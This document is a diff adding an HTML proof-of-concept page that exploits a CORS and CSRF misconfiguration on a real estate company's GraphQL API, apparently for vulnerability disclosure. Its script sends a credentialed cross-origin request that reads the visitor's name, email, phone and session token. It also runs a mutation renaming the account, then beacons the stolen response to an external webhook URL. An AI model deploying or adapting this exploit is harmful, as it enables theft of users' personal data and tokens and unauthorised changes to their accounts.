@@ -1,8 +1,86 @@
-<html>
-<title>POC</title>
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OpenDoor(CORS + CSRF)POC </title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 40px; background-color: #f9f9f9; }
+        .card { max-width: 600px; margin: auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
+        #timer-display { font-size: 48px; font-weight: bold; color: #e74c3c; margin: 20px 0; }
+        .status-text { color: #555; font-size: 18px; }
+        code { background: #eee; padding: 2px 5px; border-radius: 4px; }
+    </style>
+</head>
 <body>
-<h1>POC Created by Prashant !!! </h1>
+
+<div class="card">
+    <h2>OpenDoor(CORS + CSRF) GraphQL POC</h2>
+    <p class="status-text">Due to misconfigured origin header, any third party website can perform read/write operation on Opendorr. </p>
+    <div id="timer-display">3</div>
+    <p style="font-size: 14px; color: #888;">Targeting: <code>CORS at https://graphql.managed.services.opendoor.com/api/graphql</code></p>
+</div>
+
+<script>
+    let secondsLeft = 3;
+    const display = document.getElementById('timer-display');
+
+    // Visual Countdown Logic
+    const countdown = setInterval(() => {
+        secondsLeft--;
+        display.innerText = secondsLeft;
+        
+        if (secondsLeft <= 0) {
+            clearInterval(countdown);
+            display.innerText = "Executing...";
+            display.style.color = "#27ae60";
+            sendGraphQLRequest();
+        }
+    }, 1000);
+
+    // Your Fetch Logic
+    function sendGraphQLRequest() {
+        fetch("https://graphql.managed.services.opendoor.com/api/graphql", {
+            method: "POST",
+            credentials: "include",
+            headers: {
+                "Content-Type": "application/json",
+                "Apollographql-Client-Name": "reception-fe-redux-tk",
+                "Apollographql-Client-Version": "1.0"
+            },
+            body: JSON.stringify([
+                {
+                    query: `query getHuman{web{userSession{human{full_name customer_uuid email first_name opendoor_internal_access primary_phone token organizations{uuid name}}}}}`,
+                    variables: {},
+                    operationName: "getHuman"
+                },
+                {
+                    operationName: "OffersSnapshot",
+                    variables: {},
+                    query: `query OffersSnapshot{buyer{offersSnapshot{offers{id addressId contractSignatureId createdAt price state source propertyAddress propertyPhoto __typename} __typename} __typename}}`
+                },
+                {
+                    operationName: "UpdateCustomerDetails",
+                    variables: { firstName: "Bobthebuilder", lastName: "Hack" },
+                    query: `mutation UpdateCustomerDetails($firstName:String!,$lastName:String!){customerService{updateCurrent(input:{firstName:$firstName,lastName:$lastName}){updatedCustomer{uuid firstName lastName __typename} __typename} __typename}}`
+                }
+            ])
+        })
+        .then(r => r.text().then(t => {
+            alert(`Status: ${r.status}\n\nResponse:\n${t}`);
+            // Attempt to beacon the data back to your server
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon("https://webhook.site/843a557b-f603-4707-9c9b-201ee4369d4e/query", t);
+            }
+        }))
+        .catch(e => {
+            console.error("Request Error:", e);
+            alert("Request failed:\n" + e);
+        });
+    }
+</script>
 
 </body>
 </html>
+
